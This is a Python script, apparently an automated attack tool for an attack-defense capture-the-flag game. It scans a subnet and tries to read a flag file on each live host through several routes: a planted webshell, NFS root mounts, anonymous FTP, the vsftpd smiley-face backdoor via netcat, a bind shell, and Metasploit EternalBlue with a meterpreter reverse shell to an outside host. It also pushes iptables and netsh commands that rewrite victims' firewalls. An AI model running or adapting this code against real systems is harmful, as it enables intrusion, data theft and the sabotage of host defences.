#coding:utf-8
import socket, os, threading, re, requests
from netaddr import IPNetwork
ip,alive_list,msf_port=[],[],10000
sem=threading.Semaphore(10)
os.system('rm -rf msf')
os.mkdir('msf')
for c in range(2, 255 + 1):
    for d in range(240, 250 + 1):
        ip.append('10.101.' + str(c) + '.' + str(d))
def scan(ip,port):
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.settimeout(0.01)
    r = sock.connect_ex((ip,port))
    sock.close()
    if r == 0:return True

def get_alive(ip):
    port_list = [21,22,23,80,445,2049,3306,3389,8080,8888]
    for port in port_list:
        if scan(ip,port):
            alive_list.append(ip)
            return
def main(aip,msf_port):
    with sem:
        linuxcmd = "iptables -A INPUT -s "+str(IPNetwork(aip+"/24").cidr)+" -j ACCEPT;iptables -A INPUT -s "+str(IPNetwork(aip+"/16").cidr)+" -j DROP;"
        wincmd = "netsh advfirewall reset&netsh advfirewall firewall set rule name=all new enable=no"+"&netsh advfirewall firewall add rule name=allow dir=in action=allow remoteip="+str(IPNetwork(aip+"/24").cidr)
        try:
            port_list=[80,888,8001,8080,8081,8888,9098]
            for port in port_list:
                if scan(aip,port):
                    html = requests.get("http://"+aip+':'+str(port)+"/?cmd=cat /root/flagvalue.txt", timeout=0.1).text
                    flag = re.findall(r'<pre>(.*?)</pre>',html)[0]
                    if len(flag) == 32:
                        print "WebShell:"+aip,flag
                        return
        except Exception:pass
        try:
            if scan(aip,2049):
                nfs_path = '/mnt/nfs/'+aip
                if not os.path.exists(nfs_path):os.makedirs(nfs_path)
                os.system('mount.nfs -o nfsvers=4.0,soft '+aip+':/ '+nfs_path)
                flag = os.popen('cat '+nfs_path+'/root/flagvalue.txt').read()
                os.system('umount -fl ' + nfs_path)
                if len(flag) == 32:
                    print "NSF:" + aip,flag
                    return
        except Exception:pass
        try:
            if scan(aip,21):
                flag = os.popen('curl -s ftp://'+aip+'/flagvalue.txt').read()
                if len(flag) == 32:
                    print "FTP-Any:" + aip,flag
                    return
                else:
                    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                    sock.connect((aip,21))
                    sock.send("USER e:)\n")
                    sock.recv(1024)
                    sock.send("PASS \n")
                    sock.close()
                    flag = os.popen('echo "cat /root/flagvalue.txt;'+linuxcmd+'exit;" | nc %s 6200'%aip).read()
                    if len(flag) == 32:
                        print "FTP-234:"+aip,flag
                        return
        except Exception:pass
        try:
            if scan(aip,30001):
                flag = os.popen('echo "cat /root/flagvalue.txt;' + linuxcmd + 'exit;" | nc %s 30001' % aip).read()
                if len(flag) == 32:
                    print "NC:" + aip, flag
                    return
        except Exception:pass
        try:
            if scan(aip,445):
                cfe = open('./msf/' + aip+'.rc', 'w')
                cfc = open('./msf/' + aip + '.cmd', 'w')
                cfe.write('use exploit/windows/smb/ms17_010_eternalblue\n')
                cfe.write('set payload windows/x64/meterpreter/reverse_tcp\n')
                cfe.write('set lhost 10.200.200.10\n')
                cfe.write('set rhost ' + aip + '\n')
                cfe.write('set lport ' + msf_port + '\n')
                cfe.write('exploit')
                cfc.write("\n"+wincmd+"\nexit"*6) #如果目标为Windows切换至Windows变量
                cfe.close()
                cfc.close()
                res = os.popen('cat cmd.txt msf/'+aip+'.cmd|msfconsole -r msf/' + aip + '.rc 2>/dev/null').read()
                flag = re.findall(r'Flag~(.*?)~~', res)[0]
                if len(flag) == 32:
                    print "MSF:" + aip, flag
                    return
        except Exception:pass
        print aip, "Attack Fail!"
for i in ip:
    threading.Thread(target=get_alive,args=(i,)).start()
for aip in alive_list:
    msf_port+=1
    threading.Thread(target=main, args=[aip,str(msf_port),]).start()